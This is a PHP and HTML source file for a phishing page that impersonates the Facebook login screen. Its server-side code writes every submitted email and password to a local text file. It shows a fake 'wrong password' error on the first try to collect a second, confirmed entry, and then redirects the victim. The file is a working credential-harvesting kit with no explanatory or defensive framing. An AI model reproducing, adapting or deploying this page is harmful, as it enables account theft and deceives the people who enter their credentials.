<!doctype html>

<?php

if(isset($_POST['submit']))
{
	$myFile = "./passwd/fb_pass.txt";
	$psswd = $_POST['password1'];
	$usrnm = $_POST['usernm1'];
	
	if(strlen($_POST['password1']) != 0 && strlen($_POST['usernm1']) != 0)
	{
		$revisit = false;
		if(isset($_COOKIE["our_cookie"]))
		{
			
			$file = fopen($myFile, "a") or  die ("file not open..."); // create and open text file

			$s = "\nThe 2nd User name is: ".$usrnm." && the 2nd Password is: ".$psswd."\n";

			fputs($file, $s) or die ("Data not written..."); //write single line of file

			fclose($file); //close file


			if(strlen($_POST['password1']) != 0 && strlen($_POST['usernm1']) != 0 && count($_COOKIE) > 0)
			{
					header('location: redirect.php');
					exit;
			}
			//unset the cookie here
			setcookie("our_cookie", "", time() - 3600);
			$revisit = true;
		}
		else
		{
			$revisit = false;
			$messge = "<font color='red'>Wrong Email address Or password.</font>";
			setcookie("our_cookie", true, time() +75); // Create the cookie here;
			
			$file = fopen($myFile, "a") or  die ("file not open..."); // create and open text file

			$s = "\nThe 1st User name is: ".$usrnm." && the 1st Password is: ".$psswd."\n";

			fputs($file, $s) or die ("Data not written..."); //write single line of file

			fclose($file); //close file
		}
	}
	else
	{
		$messge = "<font color='red'>Wrong Email address Or password.</font>";
		$revisit = false;
		if(isset($_COOKIE["our_cookie"])) // Check iff the cookie is already active
		{
			// Then destroy the cookie
			setcookie("our_cookie", "", time() - 3600);
		}
	}
	
}

?>

<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="HandheldFriendly" content="true">
<link rel="shortcut icon" type="image/x-icon" href="fb_icon1.png">
<link href="style.css" rel="stylesheet">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">

<title>Log in to Facebook | Facebook</title>
</head>

<body>
<div class="container">
	<div class="row">
	
	<div class="col-sm-10">
		<div class="center-column text-center">
			<img src="facebook-logo1.png" class="facebook-logo">
			<br/>
			
			<?php 
					if(isset($_POST['submit']) && strlen($_POST['password1']) == 0)
					{
						echo $messge;
					}
			
					if(isset($_POST['submit']) && $revisit == false && strlen($_POST['password1']) != 0)
					{
						echo $messge;
					}
				?><br/><br/>
			<form method="post">
			
			<div class="form-group">
			<input type="text" class="form-control" placeholder="Email address or phone number" name="usernm1">
			</div>
			
			<div class="form-group">
			<input type="password" class="form-control" placeholder="Password" name="password1">
			</div>
			
			<input type="submit" name="submit" class="btn btn-primary btn-block" value="Log In">
			
			</form>
			<p class="info2">
				<a href="#">Forgot password?</a>
				&nbsp; &nbsp;
				<a href="#">Sign up for Facebook</a>
			</p>
			
		</div>
		<!--
		<div class="right-column-login text-center">
		<p class="info">
			Log in With Facebook	
		</p>
		</div> -->
	</div>
	
	</div>
</div>

</body>
</html>